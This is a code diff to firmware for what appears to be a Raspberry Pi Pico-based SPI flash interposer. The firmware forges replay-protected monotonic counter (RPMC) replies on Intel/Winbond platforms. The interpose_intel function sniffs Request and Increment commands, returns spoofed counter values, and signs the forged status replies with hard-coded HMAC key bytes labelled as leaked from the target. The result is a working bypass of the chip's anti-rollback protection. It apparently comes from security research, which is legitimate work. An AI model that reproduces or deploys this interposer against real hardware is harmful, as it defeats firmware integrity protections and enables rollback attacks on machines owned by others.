@@ -29,8 +29,8 @@ inline uint32_t reverse(const uint32_t x)
 // Values for flash state 399093a25b1b61aeb4caf0de42522fba
 static uint32_t counter_values[] = {0xCF6, 0xCD4};
 
-// Keys for key_data 01000000
-const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
+// Leaked session keys for key_data 0x1 from our target
+const static uint8_t leaked_keys[4 * HMAC_KEY_SIZE] = {
     // Key Slot 0
     0xf4, 0x27, 0xad, 0xa3, 0x76, 0x79, 0x6f, 0x27,
     0x78, 0x10, 0x78, 0xb2, 0x0a, 0x6c, 0x68, 0x79,
@@ -54,6 +54,7 @@ const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
 };
 
 
+/* Reverse byte order in chunks of 4, in place. */
 static void u32_into_u8(uint32_t *u32, uint8_t *u8, size_t count)
 {
     size_t i;
@@ -73,11 +74,17 @@ static void u32_into_u8(uint32_t *u32, uint8_t *u8, size_t count)
 }
 
 /* Assumes shift direction is set to left since otherwise put_blocking can be
- * used without as is.
+ * used as is.
  */
 static inline void pio_sm_put_byte_blocking(PIO pio, uint sm, uint8_t data)
 {
     pio_sm_put_blocking(pio, sm, data << 24);
+}
+
+void interposer_send_short_status(PIO pio, uint sm, enum rpmc_status_short status)
+{
+    pio_sm_put_blocking(pio, sm, sizeof(status) * 8 - 1);
+    pio_sm_put_byte_blocking(pio, sm, status);
 }
 
 void interposer_send(PIO pio, uint sm, const uint8_t * data, const uint32_t count)
@@ -110,39 +117,45 @@ void interposer_send(PIO pio, uint sm, const uint8_t * data, const uint32_t coun
 }
 
 /*
- * Intel strategy: Let all OP1s pass, but fake the OP2 responses for request and
- * increment commands. With the request replies we return the spoofed counter
- * values and the increments replies are needed because otherwise the counter
- * value mismatch would get flagged in the status by the chip. Update commands
- * are not of interest to us, because we already know that Intel calls them with
- * KeyData 0x1.
+ * Intel + Winbond strategy:
+ *
+ * Let all OP1s pass through, but fake the OP2 responses for Request and
+ * Increment commands (also tracking the latter to update the spoofed counter
+ * value). With the Request replies we return the spoofed counter values and the
+ * Increments replies are needed because otherwise the counter value mismatch
+ * would get flagged in the status by the chip. We use the leaked HMAC key to
+ * sign the long status replies.
+ *
+ * Update commands are not of interest to us, because we already know that Intel
+ * uses the same KeyData.
  */
-void interpose_intel()
-{
+void interpose_intel() {
     // tell the first SM to match RPMC request commands
-    pio_sm_put_blocking(request_sniffer.pio, request_sniffer.sm, 0x9B03);
+    pio_sm_put_blocking(request_sniffer.pio, request_sniffer.sm, RPMC_REQUEST);
 
-    // tell the second SM to match OP2
-    pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, 0x96);
+    // tell the interposer SM to match OP2
+    pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, RPMC_OP2);
     // pre-fill the FIFO with a busy wait message
-    pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-    pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);
+    interposer_send_short_status(read_interposer.pio, read_interposer.sm, WAIT);
 
     // tell the third SM to match RPMC increment commands
-    pio_sm_put_blocking(increment_sniffer.pio, increment_sniffer.sm, 0x9B02);
+    pio_sm_put_blocking(increment_sniffer.pio, increment_sniffer.sm, RPMC_INCREMENT);
 
-    unsigned n_req = 1;
-    unsigned n_inc = 1;
-
-    // TODO: do this via the pis_smX_rx_fifo_not_empty interrupts
+    // TODO: do this via the pis_smX_rx_fifo_not_empty interrupts?
     while (true) {
         if (!pio_sm_is_rx_fifo_empty(request_sniffer.pio, request_sniffer.sm)) {
+            // Request command
+
             union rpmc_request req;
             union rpmc_read_data status = { .status = DONE };
 
-            // get the request command
+            // get the command bytes
             for (unsigned i = 0; i < count_of(req.words); ++i)
                 req.words[i] = pio_sm_get_blocking(request_sniffer.pio, request_sniffer.sm);
+
+#if 0
+            print_rpmc_request(req);
+#endif
 
             // at this point we already sent the pre-filled busy message, so we
             // don't need to worry about that here
@@ -150,12 +163,11 @@ void interpose_intel()
             // fix byte order of everything
             u32_into_u8(req.words, req.buf, sizeof(req.buf));
 
-            const uint8_t *key = hmac_keys + HMAC_KEY_SIZE * req.idx;
-
+            // calculate the signature using the leaked key
             memcpy(status.tag, req.tag, sizeof(status.tag));
             status.val = reverse(counter_values[req.idx]);
             mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
-                            key,
+                            leaked_keys + HMAC_KEY_SIZE * req.idx,
                             HMAC_KEY_SIZE,
                             status.tag,
                             sizeof(status.tag) + sizeof(status.val),
@@ -163,21 +175,11 @@ void interpose_intel()
             static_assert(sizeof(status.sig) == HMAC_KEY_SIZE);
 
 #if 0
-            printf("status %d:\n"
-                   "\tidx: %02x\n"
-                   "\ttag: %02x%02x...%02x%02x\n"
-                   "\tval: %04x\n"
-                   "\tsig: %02x%02x...%02x%02x\n",
-                   n_req++,
-                   req.idx,
-                   status.tag[0], status.tag[1], status.tag[10], status.tag[11],
-                   status.val,
-                   status.sig[0], status.sig[1], status.sig[30], status.sig[31]);
+            print_rpmc_read_data(status);
 #endif
 
             // send a short ready message
-            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);
+            interposer_send_short_status(read_interposer.pio, read_interposer.sm, DONE);
 
             // send the long status
             interposer_send(read_interposer.pio, read_interposer.sm, status.buf, sizeof(status.buf));
@@ -186,21 +188,14 @@ void interpose_intel()
             pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, 1 << 31);
 
             // fill the FIFO with a busy wait message again
-            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);
+            interposer_send_short_status(read_interposer.pio, read_interposer.sm, WAIT);
 
-#if 0
-            printf("request %d:\n"
-                   "\tidx: %02x\n"
-                   "\ttag: %02x%02x...%02x%02x\n",
-                   n_req++, req.idx, req.tag[0], req.tag[1], req.tag[10], req.tag[11]);
-            //printf("\top1: %02x\n", req.op1);
-            //printf("\ttyp: %02x\n", req.typ);
-#endif
         } else if (!pio_sm_is_rx_fifo_empty(increment_sniffer.pio, increment_sniffer.sm)) {
+            // Increment command
+
             union rpmc_increment inc;
 
-            // get the increment command
+            // get the command bytes
             for (unsigned i = 0; i < count_of(inc.words); ++i)
                 inc.words[i] = pio_sm_get_blocking(increment_sniffer.pio, increment_sniffer.sm);
 
@@ -211,8 +206,9 @@ void interpose_intel()
             u32_into_u8(&inc.words[0], &inc.buf[0], 4);
 
 #if 1
-            printf("++c%d (=%x)\n", inc.idx, inc.old + 1);
+            print_rpmc_increment(inc);
 #endif
+
             if (inc.idx > 1)
                 continue;
 
@@ -224,20 +220,19 @@ void interpose_intel()
 
             counter_values[inc.idx]++;
 
-            // send a short ready message
-            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);
+            // Send a done message.
+            interposer_send_short_status(read_interposer.pio, read_interposer.sm, DONE);
 
-            // send a short ready message
-            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);
+            // Even though there is no more data, we noticed that the Read
+            // command is executed in the long form too on Intel. We will simply
+            // send 0xFF... after the status
+            interposer_send_short_status(read_interposer.pio, read_interposer.sm, DONE);
 
             // tell the SM to wait for the next request
             pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, 1 << 31);
 
             // fill the FIFO with a busy wait message again
-            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
-            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);
+            interposer_send_short_status(read_interposer.pio, read_interposer.sm, WAIT);
         }
     }
 }
@@ -478,7 +473,7 @@ switch_case:
             break;
 
         case 'r':
-            // Disconnect the chip from the board
+            // Disconnect the chip from the target
             gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
             sleep_ms(1);
 
@@ -497,18 +492,15 @@ switch_case:
 
         case 't':
             printf("Test\n");
-            //gpio_put(PIN_N_MUX_EN, 0);
-            gpio_put(PIN_MUX_INTERPOSE, 0);
 
             while (getchar()) {
                 printf("Toggle\n");
-                gpio_xor_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_CHIP_VOLT_SEL));
+                gpio_xor_mask(1 << PIN_MUX_INTERPOSE);
             }
             break;
 
         default: // do nothing just leave chip directly connected
-            //gpio_put(PIN_N_MUX_EN, 0);
-            gpio_put(PIN_MUX_INTERPOSE, 0);
+            gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
             printf("Just passing traffic through\n");
             break;
     }
